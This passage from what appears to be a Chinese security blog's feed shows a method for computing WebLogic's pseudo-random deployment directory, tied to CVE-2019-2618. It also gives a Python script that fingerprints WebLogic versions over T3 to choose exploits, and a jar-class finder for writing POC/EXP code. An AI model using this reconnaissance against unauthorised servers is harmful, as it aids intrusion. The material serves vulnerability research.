探究生成算法</h2><p>于是我打算跟踪下weblogic源码，扒出负责生产伪随机数的算法函数。由于其生成伪随机目录在weblogic未启动完全情况下，故通过weblogic配置的调试比较难。这种情况下更好的思路是插桩，但要插哪个函数的桩呢？</p><p>我在翻阅weblogic的源码（weblogic.jar）时，着重关注文件操作和部署接口的代码，发现了一个相关性很大的方法。该函数就在weblogic的路径工具类（weblogic.application.utils.PathUtils）中。</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-code.png" alt="相关方法"></p><p>在判断不失误的情况下，我们只要知道其传入的参数值就知道改函数如何使用了。为此我编写了如下代码，使用javassist将打印函数参数值的代码注入到该函数中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">changeMethode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassPool.getDefault().insertClassPath(<span class="string">"/Users/c0ny1/IdeaProjects/weblogic-path-test/lib/weblogic.jar"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取需要修改的类</span></span><br><span class="line">            CtClass cls = ClassPool.getDefault().getCtClass(<span class="string">"weblogic.application.utils.PathUtils"</span>);</span><br><span class="line">            <span class="comment">// 获取类中的printTest方法</span></span><br><span class="line">            CtMethod m = cls.getDeclaredMethod(<span class="string">"generateTempPath"</span>);</span><br><span class="line">            <span class="comment">// 在方法中插入新的代码</span></span><br><span class="line">            <span class="comment">//m.insertBefore("System.out.println($1 + File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36));") ;</span></span><br><span class="line">            <span class="comment">// 修改该方法的内容</span></span><br><span class="line">            m.setBody(<span class="string">"&#123;StringBuffer var3 = new StringBuffer();\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($1 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append($1);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($2 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($2);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        if ($3 != null) &#123;\n"</span> +</span><br><span class="line">                    <span class="string">"            var3.append(\"_\").append($3);\n"</span> +</span><br><span class="line">                    <span class="string">"        &#125;\n"</span> +</span><br><span class="line">                    <span class="string">"\n"</span> +</span><br><span class="line">                    <span class="string">"        String str = $2 + java.io.File.separator + Long.toString((long)Math.abs(var3.toString().hashCode()), 36);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p1:\" + $1);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p2:\" + $2);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] p3:\" + $3);\n"</span> +</span><br><span class="line">                    <span class="string">"        System.out.println(\"[+] \" + str);\n"</span> +</span><br><span class="line">                    <span class="string">"        return str;&#125;"</span>);</span><br><span class="line">                    </span><br><span class="line">            <span class="comment">// 解除代码锁定,恢复可编辑状态</span></span><br><span class="line">            cls.defrost();</span><br><span class="line">            <span class="comment">// 写出到外存中</span></span><br><span class="line">            cls.writeFile(<span class="string">"./PathUtils.class"</span>);</span><br><span class="line">            <span class="comment">// testJarClass.writeFile(other path);</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        changeMethode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/inject-code.png" alt="被注入代码后的PathUtils类"></p><p>将插桩后的PathUtils类通过Winrar软件覆盖weblogic.jar原来的类，然后重新启动weblogic，即可从控制台查看到如下：</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/weblogic-run-result.png" alt="weblogic重启运行结果"></p><p>由此我们知道web应用bea_wls9_async_response的随机目录被生成时，该函数被调用并传入<code>server name</code>和<code>application name</code>，这也验证我们之前的猜想。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">generateTempPath(<span class="string">"c0ny1"</span>,<span class="string">"bea_wls9_async_response"</span>,<span class="string">"bea_wls9_async_response.war"</span>)</span><br></pre></td></tr></table></figure><h2 id="0x04-伪随机目录生成代码编写"><a href="#0x04-伪随机目录生成代码编写" class="headerlink" title="0x04 伪随机目录生成代码编写"></a>0x04 伪随机目录生成代码编写</h2><p>到这里写计算伪随机目录生成程序就是很简单的事了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WeblogicPathBuilder</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">generateTempPath</span><span class="params">(String paramString1, String paramString2, String paramString3)</span> </span>&#123;</span><br><span class="line">        StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString1 != <span class="keyword">null</span>) stringBuffer.append(paramString1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (paramString3 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            stringBuffer.append(<span class="string">"_"</span>).append(paramString3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Long.toString(Math.abs(stringBuffer.toString().hashCode()), <span class="number">36</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String ServerName = args[<span class="number">0</span>];</span><br><span class="line">        String AppName = args[<span class="number">1</span>];</span><br><span class="line">        String AppWarName = AppName + <span class="string">".war"</span>;</span><br><span class="line">        System.out.println(generateTempPath(ServerName,AppName,AppWarName));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>计算结果和weblogic实际生成完全吻合！！！</p><p><img src="/articles/2019/weblogic-pseudo-random-dir-generation-algorithm-exploration/calc.png" alt="计算结果"></p><p>之后的几天逛Github时，发现早就有人发现其规律。</p><p><a href="https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py" target="_blank" rel="noopener">https://github.com/dr0op/WeblogicScan/blob/master/app/plugins/CVE-2019-2618.py</a></p>]]></content>
      
      
      <categories>
          
          <category> 安全研究 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>通过t3协议识别weblogic版本</title>
      <link href="/articles/2019/detection-weblogic-version-by-t3/"/>
      <url>/articles/2019/detection-weblogic-version-by-t3/</url>
      
        <content type="html"><![CDATA[<p><strong>识别weblogic版本有什么用呢？</strong></p><p>在检测weblogic漏洞之前，我们往往需要探测下weblogic版本。好判断是否在漏洞版本范围，同时也为我们构造EXP做准备（相同漏洞，可能因为weblogic版本不同需要的对应的EXP，比如CVE-2019-2725）</p><a id="more"></a><h2 id="0x01-以前的方法"><a href="#0x01-以前的方法" class="headerlink" title="0x01 以前的方法"></a>0x01 以前的方法</h2><p>以前的方法是访问控制台登录页面，页面底部便有版本号！这里注意404页面的<code>10.4.5</code>并不是版本号。</p><p>http://<em>.</em>.<em>.</em>:7001/console/login/LoginForm.jsp</p><p><img src="/articles/2019/detection-weblogic-version-by-t3/login.png" alt="控制台登录页面"></p><p>然而这个页面可能会被删除或禁止访问，那有没有其他方法呢？</p><h2 id="0x02-通过t3协议识别"><a href="#0x02-通过t3协议识别" class="headerlink" title="0x02 通过t3协议识别"></a>0x02 通过t3协议识别</h2><p>最近在学习t3协议时，使用wireshark抓包时发现，协议报文中带有weblogic的版本</p><p><img src="/articles/2019/detection-weblogic-version-by-t3/10.3.6.0.png" alt="使用t3协议10.3.6.0版本通信"></p><p><img src="/articles/2019/detection-weblogic-version-by-t3/12.1.3.0.png" alt="使用t3协议12.1.3.0版本通信"></p><p>所以只需要通过t3协议发送以下数据包，即可从返回包中获取Weblogic版本。</p><pre><code>t3 10.3.6AS: 255HL: 19</code></pre><p>这里需要注意，有时候发送数据包时，可能只会返回一个<code>HELLO</code>。这时候说明t3协议应该是开启的，需要多次提交探测包，才可能在某次中成功获取到。</p><p>下面使用脚本来完成我们的上面的想法。</p><pre><code class="python"><span class="comment">#coding=utf-8</span><span class="keyword">import</span> sys<span class="keyword">import</span> socket<span class="keyword">from</span> socket <span class="keyword">import</span> error <span class="keyword">as</span> socket_error<span class="keyword">import</span> urllib<span class="string">'''</span><span class="string">'''</span><span class="function"><span class="keyword">def</span> <span class="title">t3conn</span><span class="params">(host, port)</span>:</span>        <span class="keyword">try</span>:            server_address = (host, port)            <span class="comment">#print 'INFO: Attempting Connection: ' + str(server_address)</span>            sock = socket.create_connection(server_address, <span class="number">4</span>)            sock.settimeout(<span class="number">5</span>)            headers = <span class="string">'t3 10.3.6\nAS:255\nHL:19\n\n'</span>            sock.sendall(headers)            data = <span class="string">""</span>            <span class="keyword">try</span>:                data = sock.recv(<span class="number">1024</span>)            <span class="keyword">except</span> socket.timeout:                <span class="keyword">print</span> <span class="string">'ERROR: Socket Timeout Occurred: '</span> + str(host) + <span class="string">':'</span> + str(port) + <span class="string">'\n'</span>            sock.close()            <span class="keyword">return</span> data        <span class="keyword">except</span> socket_error:            <span class="keyword">print</span> <span class="string">'ERROR: Connection Failed: '</span> + str(host) + <span class="string">':'</span> + str(port) + <span class="string">'\n'</span>            <span class="keyword">return</span> <span class="string">""</span><span class="function"><span class="keyword">def</span> <span class="title">parseURL</span><span class="params">(url)</span>:</span>    protocol, s1 = urllib.splittype(url)    host, s2=  urllib.splithost(s1)    host, port = urllib.splitport(host)    <span class="keyword">if</span> port == <span class="literal">None</span> <span class="keyword">and</span> protocol == <span class="string">'https'</span>:        port = <span class="number">443</span>    <span class="keyword">elif</span> port == <span class="literal">None</span> <span class="keyword">and</span> protocol == <span class="string">'http'</span>:        port = <span class="number">80</span>    <span class="keyword">return</span> protocol,host,port<span class="function"><span class="keyword">def</span> <span class="title">weblogic</span><span class="params">(url)</span>:</span>    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):        protocol,host,port = parseURL(url)        data = t3conn(host, port)        <span class="keyword">if</span> data.strip() == <span class="string">'HELO'</span>:            <span class="keyword">print</span> <span class="string">'INFO: Sever only returned HELO, retrying to get server version.'</span>            <span class="keyword">continue</span>        <span class="keyword">if</span> data == <span class="string">""</span>:            <span class="keyword">break</span>        <span class="keyword">print</span> data        <span class="keyword">if</span> <span class="string">'HELO'</span> <span class="keyword">in</span> data:            found_weblogic_version = data[<span class="number">5</span>:<span class="number">13</span>]            <span class="keyword">print</span> <span class="string">'[+] version: %s'</span> % found_weblogic_version             <span class="comment">#print '[+] result: %s' % data</span>            <span class="keyword">break</span><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url)</span>:</span>    <span class="keyword">pass</span><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:    weblogic(sys.argv[<span class="number">1</span>])</code></pre><p><img src="/articles/2019/detection-weblogic-version-by-t3/result.png" alt="脚本探测结果"></p><p>如果未探测到，以下几种可能情况：</p><ol><li>t3协议未启用</li><li>服务器做了负载均衡</li></ol><h2 id="0x03-遗留问题"><a href="#0x03-遗留问题" class="headerlink" title="0x03 遗留问题"></a>0x03 遗留问题</h2><p>有些weblogic站点用的https协议，得有t3s协议去探测，我虽然在代码中考虑到了。但是没未成功，一是没有现成的环境，二是没有实实在在使用过t3s协议。等等weblogic经验更丰富时，在解决！</p><h2 id="0x04-后续"><a href="#0x04-后续" class="headerlink" title="0x04 后续"></a>0x04 后续</h2><p>本来想学n1nty师傅对struts2框架的识别的思路，研究目标应用的底层代码，再构造特定的数据包来识别。无奈目前的知识和经验储备还无法支撑这个思路，等后面深入weblogic底层代码时，有发现再做尝试。</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何快速找到POC/EXP依赖的jar？</title>
      <link href="/articles/2019/quickly-find-jars-that-depend-on-poc-exp/"/>
      <url>/articles/2019/quickly-find-jars-that-depend-on-poc-exp/</url>
      
        <content type="html"><![CDATA[<p>标题主要是针对安全人员，如果针对是开发人员的话，应该是 <strong>如何快速从众多jar中找到目标类？</strong></p><p>在编写Java相关中间件或者CMS的POC/EXP时一般都会依赖它们的某个jar，但它们的jar往往非常多，并且会分散在各个目录下，那么如何快速找到它们呢？</p><h2 id="0x01-之前的方案"><a href="#0x01-之前的方案" class="headerlink" title="0x01 之前的方案"></a>0x01 之前的方案</h2><p>以前我的方法是把所有的jar复制到一个目录下，然后把它们导入到IDEA中，最后使用IDEA搜索。例如最近在写的一个Weblogic漏洞的POC，编译时提示找不到<code>weblogic.work.ExecuteThread</code>,这时就可以使用该方法搜索到它在<code>wlthin3client.jar</code>中，然后将其引入问题解决。</p><p><img src="/articles/2019/quickly-find-jars-that-depend-on-poc-exp/findbyIDEA.png" alt="通过IDEA搜索"></p><p>不过细想，需要以下步骤：</p><ol><li>新建目录</li><li>复制所有jar到目录下</li><li>打开IDEA</li><li>将所有jar导入IDEA</li><li>在IDEA中搜索目标类 </li></ol><p>这还是稍微有点繁琐了，那能不能更加轻便快速地找到我们需要的类呢？下面通过编程来优雅地给大家省几秒钟。</p><h2 id="0x02-编写代码"><a href="#0x02-编写代码" class="headerlink" title="0x02 编写代码"></a>0x02 编写代码</h2><p>我们要实现的是需提供<code>类名</code>，和<code>jar所在目录</code>就可搜索的小工具，它支持完整类名搜索，也支持通配符。具体如何实现，请参考我代码中的注释和提供的参考文章链接。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> me.gv7.searchclassinjar;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.Enumeration;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipEntry;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.ZipFile;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: c0ny1</span></span><br><span class="line"><span class="comment"> * date: 2019-05-13 23:51:42</span></span><br><span class="line"><span class="comment"> * description: 快速从众多jar中，搜索目标class所在的jar。不区分大小写，支持通配符搜索。</span></span><br><span class="line"><span class="comment"> * reference：</span></span><br><span class="line"><span class="comment"> *  1.https://jdkleo.iteye.com/blog/2392642</span></span><br><span class="line"><span class="comment"> *  2.https://lihong11.iteye.com/blog/1936694</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SearchClassInJar</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String className;</span><br><span class="line">    <span class="keyword">private</span> String jarDir;</span><br><span class="line">    <span class="keyword">private</span> Integer totalNum =  <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SearchClassInJar</span><span class="params">(String className,String jarDir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className = className;</span><br><span class="line">        <span class="keyword">this</span>.jarDir = jarDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将jar中的类文件路径形式改为包路径形式</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> String <span class="title">getClassName</span><span class="params">(ZipEntry entry)</span> </span>&#123;</span><br><span class="line">        StringBuffer className = <span class="keyword">new</span> StringBuffer(entry.getName().replace(<span class="string">'/'</span>,<span class="string">'.'</span>));</span><br><span class="line">        <span class="keyword">return</span> className.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从jar从搜索目标类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">searchClass</span><span class="params">(<span class="keyword">boolean</span> recurse)</span> </span>&#123;</span><br><span class="line">        searchDir(<span class="keyword">this</span>.jarDir, recurse);</span><br><span class="line">        System.out.println(String.format(<span class="string">"[!] Find %s classes"</span>,<span class="keyword">this</span>.totalNum));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//递归搜索目录和子目录下所有jar和zip文件</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">searchDir</span><span class="params">(String dir, <span class="keyword">boolean</span> recurse)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            File d = <span class="keyword">new</span> File(dir);</span><br><span class="line">            <span class="keyword">if</span> (!d.isDirectory()) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            File[] files = d.listFiles();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (recurse &amp;&amp; files[i].isDirectory()) &#123;</span><br><span class="line">                    searchDir(files[i].getAbsolutePath(), <span class="keyword">true</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    String filename = files[i].getAbsolutePath();</span><br><span class="line">                    <span class="keyword">if</span> (filename.endsWith(<span class="string">".jar"</span>)||filename.endsWith(<span class="string">".zip"</span>)) &#123;</span><br><span class="line">                        ZipFile zip = <span class="keyword">new</span> ZipFile(filename);</span><br><span class="line">                        Enumeration entries = zip.entries();</span><br><span class="line">                        <span class="keyword">while</span> (entries.hasMoreElements()) &#123;</span><br><span class="line">                            ZipEntry entry = (ZipEntry) entries.nextElement();</span><br><span class="line">                            String thisClassName = getClassName(entry);</span><br><span class="line">                            <span class="keyword">if</span> (wildcardEquals(<span class="keyword">this</span>.className.toLowerCase(),thisClassName.toLowerCase()) || wildcardEquals(<span class="keyword">this</span>.className.toLowerCase() + <span class="string">".class"</span>,thisClassName.toLowerCase())) &#123;</span><br><span class="line">                                String res = String.format(<span class="string">"[+] %s | %s"</span>,thisClassName,filename);</span><br><span class="line">                                System.out.println(res);</span><br><span class="line">                                totalNum++;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通配符匹配</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">wildcardEquals</span><span class="params">(String wildcard, String str)</span> </span>&#123;</span><br><span class="line">        String regRule = WildcardToReg(wildcard);</span><br><span class="line">        <span class="keyword">return</span> Pattern.compile(regRule).matcher(str).matches();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将通配符转换为正则表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">WildcardToReg</span><span class="params">(String path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] chars = path.toCharArray();</span><br><span class="line">        <span class="keyword">int</span> len = chars.length;</span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">boolean</span> preX = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (chars[i] == <span class="string">'*'</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span> (preX)&#123;</span><br><span class="line">                    sb.append(<span class="string">".*"</span>);</span><br><span class="line">                    preX = <span class="keyword">false</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(i+<span class="number">1</span> == len)&#123;</span><br><span class="line">                    sb.append(<span class="string">"[^/]*"</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    preX = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (preX)&#123;</span><br><span class="line">                    sb.append(<span class="string">"[^/]*"</span>);</span><br><span class="line">                    preX = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (chars[i] == <span class="string">'?'</span>)&#123;</span><br><span class="line">                    sb.append(<span class="string">'.'</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    sb.append(chars[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length &lt; <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"SearchClassInJar v0.1"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Autor：c0ny1&lt;root@gv7.me&gt;"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Usage：java -jar SearchClassInJar.jar &lt;ClassName&gt; &lt;JarDir&gt;"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Example：java -jar SearchClassInJar.jar weblogic.work.ExecuteThread C:\\weblogic"</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        SearchClassInJar scij = <span class="keyword">new</span> SearchClassInJar(args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">        scij.searchClass(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar SearchClassInJar.jar &lt;ClassName&gt; &lt;JarDir&gt;</span><br></pre></td></tr></table></figure><p>PS：大家可自行编译，若需要我编译好的，请公众号后台回复<code>SearchClassInJar</code>获取下载地址!</p><h2 id="0x03-演示效果"><a href="#0x03-演示效果" class="headerlink" title="0x03 演示效果"></a>0x03 演示效果</h2><p>我们还是来找Weblogic下<code>weblogic.work.ExecuteThread</code>类所在的jar。命令行下运行我们写好的程序，指定要搜索的类名和weblogic安装目录即可。可以有以下三种方式搜索。</p><p><img src="/articles/2019/quickly-find-jars-that-depend-on-poc-exp/findbycode.png" alt="演示效果"></p><h2 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h2><ul><li><a href="https://jdkleo.iteye.com/blog/2392642" target="_blank" rel="noopener">java实现路径通配符<em>,*</em>,?</a></li><li><a href="https://lihong11.iteye.com/blog/1936694" target="_blank" rel="noopener">查找某个类所在jar包</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>使ysoserial支持执行自定义代码</title>
      <link href="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/"/>
      <url>/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/</url>
      
